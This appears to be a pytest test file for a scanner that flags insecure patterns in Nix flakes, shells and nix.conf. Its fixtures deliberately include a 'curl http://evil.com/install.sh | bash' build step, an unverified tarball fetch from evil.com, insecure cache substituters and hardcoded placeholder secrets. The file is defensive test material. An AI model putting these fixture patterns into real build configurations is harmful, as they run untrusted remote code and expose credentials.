"""Tests for NixAnalyzer."""

from pathlib import Path

from devai.nix_analyzer import NixAnalyzer, NixFinding


INSECURE_FLAKE = """\
{
  description = "insecure demo";

  inputs = {
    nixpkgs.url = "github:NixOS/nixpkgs/master";
    private.url = "https://user:pass@github.com/org/private-flake.git?ref=main";
  };

  outputs = { self, nixpkgs }: {
    packages.x86_64-linux.default = nixpkgs.legacyPackages.x86_64-linux.stdenv.mkDerivation {
      name = "insecure";
      buildInputs = [ ];
      api_key = "hardcoded-secret-token-12345";
      src = builtins.fetchTarball "http://evil.com/archive.tar.gz";
      buildPhase = ''
        curl http://evil.com/install.sh | bash
        export NIX_SSL_CERT_FILE=""
      '';
    };
  };
}
"""

INSECURE_SHELL = """\
{ pkgs ? import <nixpkgs> {} }:

pkgs.mkShell {
  buildInputs = [ pkgs.curl ];
  shellHook = ''
    export password="hardcoded-shell-password"
    curl --insecure https://example.com
  '';
}
"""

INSECURE_NIX_CONF = """\
substituters = http://insecure.cache.nixos.org https://cache.nixos.org
trusted-substituters = http://evil.cache.example.com
"""

HARDENED_FLAKE = """\
{
  description = "secure demo";

  inputs = {
    nixpkgs.url = "github:NixOS/nixpkgs/nixos-24.05";
  };

  outputs = { self, nixpkgs }: {
    devShells.x86_64-linux.default = nixpkgs.legacyPackages.x86_64-linux.mkShell {
      packages = with nixpkgs.legacyPackages.x86_64-linux; [ git ];
    };
  };
}
"""

HARDENED_FETCH = """\
{ pkgs ? import <nixpkgs> {} }:

pkgs.stdenv.mkDerivation {
  name = "secure-fetch";
  src = builtins.fetchTarball {
    url = "https://example.com/archive.tar.gz";
    sha256 = "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789";
  };
}
"""


class TestNixAnalyzer:
    def test_detects_insecure_flake(self, tmp_path: Path):
        (tmp_path / "flake.nix").write_text(INSECURE_FLAKE, encoding="utf-8")
        analyzer = NixAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "insecure_http" in kinds
        assert "scm_credentials" in kinds
        assert "unpinned_git_ref" in kinds
        assert "curl_pipe_shell" in kinds
        assert "tls_verify_disabled" in kinds
        assert "unverified_fetch" in kinds
        assert analyzer.health_score() < 50.0

    def test_detects_insecure_shell(self, tmp_path: Path):
        (tmp_path / "shell.nix").write_text(INSECURE_SHELL, encoding="utf-8")
        analyzer = NixAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "tls_verify_disabled" in kinds

    def test_detects_insecure_nix_conf(self, tmp_path: Path):
        (tmp_path / "nix.conf").write_text(INSECURE_NIX_CONF, encoding="utf-8")
        analyzer = NixAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert any(f.kind == "insecure_http" for f in findings)

    def test_hardened_flake_clean(self, tmp_path: Path):
        (tmp_path / "flake.nix").write_text(HARDENED_FLAKE, encoding="utf-8")
        analyzer = NixAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert high == []
        assert analyzer.health_score() == 100.0

    def test_hardened_fetch_clean(self, tmp_path: Path):
        (tmp_path / "default.nix").write_text(HARDENED_FETCH, encoding="utf-8")
        analyzer = NixAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert findings == []

    def test_finding_format(self, tmp_path: Path):
        (tmp_path / "flake.nix").write_text(INSECURE_FLAKE, encoding="utf-8")
        analyzer = NixAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        finding = next(f for f in findings if f.kind == "hardcoded_secret")
        assert finding.path == "flake.nix"
        assert "[high]" in finding.format()

    def test_summary_and_context(self, tmp_path: Path):
        (tmp_path / "flake.nix").write_text(INSECURE_FLAKE, encoding="utf-8")
        analyzer = NixAnalyzer(str(tmp_path))
        assert "Nix configs:" in analyzer.summary()
        ctx = analyzer.to_context()
        assert "Nix analysis:" in ctx
        assert "health score:" in ctx

    def test_generate_hardened_config(self):
        snippet = NixAnalyzer(".").generate_hardened_config()
        assert "nixpkgs.url" in snippet
        assert "mkShell" in snippet

    def test_detects_nix_dir_module(self, tmp_path: Path):
        nix_dir = tmp_path / "nix"
        nix_dir.mkdir()
        (nix_dir / "module.nix").write_text(
            'password = "leaked-module-secret";\n',
            encoding="utf-8",
        )
        analyzer = NixAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert any(f.path == "nix/module.nix" for f in findings)

    def test_no_configs_returns_full_score(self, tmp_path: Path):
        analyzer = NixAnalyzer(str(tmp_path))
        assert analyzer.health_score() == 100.0
        assert analyzer.stats.configs == 0

    def test_finding_dataclass(self):
        finding = NixFinding(
            kind="test",
            severity="low",
            message="test message",
            path="flake.nix",
            lineno=1,
        )
        assert "test message" in finding.format()
